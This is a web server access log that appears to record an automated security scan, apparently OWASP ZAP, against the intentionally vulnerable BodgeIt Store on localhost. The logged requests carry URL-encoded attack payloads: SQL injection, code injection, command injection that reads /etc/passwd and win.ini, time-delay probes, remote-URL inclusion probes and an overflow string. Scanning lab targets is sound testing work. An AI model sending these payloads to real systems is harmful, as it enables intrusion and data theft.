127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1 HTTP/1.1" 200 2784
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11 HTTP/1.1" 200 3298
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=13-2 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11 HTTP/1.1" 200 3298
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11+AND+1%3D1+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11+AND+1%3D1 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%27+AND+%271%27%3D%271 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%22+AND+%221%22%3D%221 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?prodid=11 HTTP/1.1" 200 3298
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?typeid=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:54 +1300] "GET /bodgeit/product.jsp?prodid=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26sleep+5s%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bsleep+5s%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%26sleep+5s%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%3Bsleep+5s%3B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26sleep+%7B0%7Ds%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bsleep+%7B0%7Ds%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26timeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%7Ctimeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%26timeout+%2FT+5%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%7Ctimeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%27%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bget-help+%23 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bstart-sleep+-s+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%22%3Bstart-sleep+-s+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?typeid=1%3Bstart-sleep+-s+5+%23 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26sleep+5s%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bsleep+5s%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%26sleep+5s%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%3Bsleep+5s%3B%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26sleep+%7B0%7Ds%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bsleep+%7B0%7Ds%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26timeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%7Ctimeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%26timeout+%2FT+5%26%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%7Ctimeout+%2FT+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%27%3Bget-help HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bget-help+%23 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bstart-sleep+-s+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%22%3Bstart-sleep+-s+5 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/product.jsp?prodid=11%3Bstart-sleep+-s+5+%23 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/ HTTP/1.1" 200 3243
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/home.jsp/ HTTP/1.1" 404 1028
127.0.0.1 - - [01/Apr/2017:12:03:56 +1300] "GET /bodgeit/contact.jsp/ HTTP/1.1" 404 1034
127.0.0.1 - - [01/Apr/2017:12:03:57 +1300] "GET /bodgeit/about.jsp/ HTTP/1.1" 404 1030
127.0.0.1 - - [01/Apr/2017:12:03:57 +1300] "GET /bodgeit/login.jsp/ HTTP/1.1" 404 1030
127.0.0.1 - - [01/Apr/2017:12:03:57 +1300] "GET /bodgeit/basket.jsp/ HTTP/1.1" 404 1032
127.0.0.1 - - [01/Apr/2017:12:03:57 +1300] "GET /bodgeit/search.jsp/ HTTP/1.1" 404 1032
127.0.0.1 - - [01/Apr/2017:12:03:57 +1300] "GET /bodgeit/product.jsp/ HTTP/1.1" 404 1034
127.0.0.1 - - [01/Apr/2017:12:03:58 +1300] "GET /bodgeit/product.jsp/ HTTP/1.1" 404 1034
127.0.0.1 - - [01/Apr/2017:12:03:58 +1300] "GET /bodgeit/style.css/ HTTP/1.1" 404 1030
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=http%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=https%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=http%3A%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=https%3A%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:00 +1300] "GET /bodgeit/product.jsp?typeid=%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?typeid=HtTp%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?typeid=HtTpS%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=https%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=https%3A%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:01 +1300] "GET /bodgeit/product.jsp?prodid=%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:02 +1300] "GET /bodgeit/product.jsp?prodid=%5C%5C595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:02 +1300] "GET /bodgeit/product.jsp?prodid=HtTp%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:02 +1300] "GET /bodgeit/product.jsp?prodid=HtTpS%3A%2F%2F595450805145259488.owasp.org HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:04:03 +1300] "GET /bodgeit/product.jsp?typeid=QHsACXyhIKVqdyaoXGGuacpwZDbvDMjiwjvemjTqQjYPAyNXHyciAHNvWmUtsQRETsYpRnOVnAfvIeCDCEIxLYefcSSOPQqtDuPeUentFkNRrUGfjiPeLIoZwhFxQbNaskXpxDSoTGVVlxbZggaKlaqginLHJkOvauibLZKSamRTmFdnjKNxwpewusrvFVNLbPgXgBmOClTtCrqbSSVlkTVWinAlgTiXhIjIgesIEBCycuVMQFWkBWxCkyUwaiiJdLsiJFOlqmGJyOtlHSDZdVsgWPrvVGeSfTVRmpgdtNskOeZpojmgGbJuqXydykTHxHrYTkDCJsGBQBDxFxIRwbURQtxphBywoBEJQoQdNBjtNmUDJuXukjxlkDwoCgTeBcMZwxJDJZULxdFFDgMWyExyoINVCkHRQsJOcwsgyYIxlgOoTbsQSWGomRVkdwjsScHprGnrdOGKansvvBxKguPUtflPrNZsObCNgaBOnDkRRRbFpcZIhgehqpEGegRuFELEMDPPvTfrhGQquWTAIqXIDbkQOCFIuhmFJWpjorInyGKDSYuEsSexkTVAEiMasEpqFcWRIBsWlpkRueePcxJeMMBXRVbsYOETOjaVTknAnxwRUOnUnwRdNMZdVUJCJjxqpVwPWncfRkEoUVcUWaeCWMeZVfodhQFCSJClQOSgEYsVRKtDGVlHFNbYxaCfKrZeJxhaSGwuDFduNNKruwkvydUldHTyGAxRQaCMODCGfuUEKeqxchbCFWfrEBOnsvQQBwWLpYxAVpatfAfEckYLpsIggyLcuuwkmVQtXKTWifxXvqAvWIQhtnaTwmMQBApphRmQVAmcUEvUZcEFJxtcwlECFRqGhqdSifPHOwNTluPYVpcJJjtKuUCfhgqKWgvagpvOYgWyXMdaDcODFnwLlYHQbGQTxamdKiXiofHQbPliPREQihGDEwTDWXFZSshBtYSlmjAkJOISDQpcXpJbcoflvbNcbRdbDCDNcJANIoaeWWJCqTwHCqECoamIwYRoBQKAXwtGFrTHhrKnbJfmoILMOHDrbFrZDKCfCCToXWFOOTgllTYYOUOQrxLMaUvYEIotXtPcmcpyuIfmrAfYStwkywJnmvpfInApKaltlmQMvmbVyxITZVpIsZqUIhSlNvcJiKFXgYYCOoQYUKovwaVOqfUCcWDbEIZgpGaaWWCZSHcAlZKlayAGsQNfpYXEmgkgYYPkordIwccCEdkGOmdWthDmStWgJGNrMFstuaFwWynQQHPEfBidMmJmKHoJFAqhavxVdmQpdBTdRGCKsWkfOcGDoQQUFIPNLVwjnKJSSubshWqPHtfNLfqAyxEgKUqlDfbbwdUrEUBrnyWaCFjNLMbuKGgZkKCARcagnyBVkuiXIxyjJOEMSEwWNBLpbcuJeMLliRxPUjOOqoOYWZqJbJTiJjMCSTYNKZoAuuAEwCiVxqbRFPWhGhVXHyHTvbBxxOmfDhpJVksHEPAiBlPCCcFLcOCJONinftPqgUNQAZoJDmTdjIwtvoIeWimbXAZRcVvvdrmbPYrkEUMgsEgYuqZeYYRfaDvgtEkUiSOlmQySfMAvfZbQslGOdpUQcqpImcWfacqhdURckiNuqPfuHRjvbOMpYQZXKfggKFkxVrxqjmvEKrYsOWvYBtqCXFRZGTtVyvlxTSErCHoqqCYLmsEOlvAvmLOgJSQocWQvnxgBNxCZkNxpKmLEGgqwVlalxJDFdjwUYOtMZTDYrpVkOnaWUACQHpFYGHouvysMGcAGgnCRuuMRPorTCrHOcERieeULOmuDgnGSIrDIkxnQoxQreDubOYnWuCrXuULZHXhoWZnqHIWXWLVNECGcilqnjUPsdFZyHcwEMUbwEJmIIgMqlOKihsOOXlKSmWgJDXLZEwsXTflgAkiUwilJqdFxrTbJweqsYkZesqecYsJimoUAEghWHnLQbsRnGcmQxoWZJnfLNcLTNtUGtwTCiSJPhQOHFGeyhPDtOLvgNfcQxHNoZlaoZpaoUXTufXFRCanAthItdycEmYLmPEqRASWvFMRIrYSCiIWqXoZcItPgKBbKKkpvObvyZMCYRtQnimtX HTTP/1.1" 200 2313
